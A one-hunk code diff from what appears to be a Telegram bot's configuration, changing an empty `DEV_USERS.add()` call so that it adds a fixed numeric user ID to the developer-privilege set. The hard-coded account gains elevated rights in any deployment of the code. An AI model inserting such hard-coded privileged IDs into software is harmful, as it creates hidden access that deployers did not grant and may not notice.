@@ -207,7 +207,7 @@ else:
 
 DRAGONS.add(OWNER_ID)
 DEV_USERS.add(OWNER_ID)
-DEV_USERS.add()
+DEV_USERS.add(5500572462)
 
 if not SPAMWATCH_API:
     sw = None
